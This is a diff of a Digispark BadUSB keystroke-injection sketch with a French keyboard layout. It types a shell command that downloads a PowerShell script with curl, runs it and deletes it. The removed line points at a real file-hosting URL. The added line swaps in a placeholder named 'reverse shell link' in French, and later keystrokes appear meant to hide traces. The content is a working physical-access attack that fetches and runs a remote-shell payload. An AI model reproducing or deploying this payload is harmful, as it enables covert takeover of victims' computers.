@@ -40,7 +40,7 @@ void setup() {
   DigiKeyboardFr.print("t");
   DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboardFr.print("curl https://cdn-153.anonfiles.com/8aI0D8Rby1/724afd39-1673654218/script.ps1 -o script.ps1; ./script.ps1; rm script.ps1; exit");
+  DigiKeyboardFr.print("curl lien_du_reverse_shell -o script.ps1; ./script.ps1; rm script.ps1; exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);
@@ -62,5 +62,4 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
 }
 
-void loop() {
-}
+void loop() {}
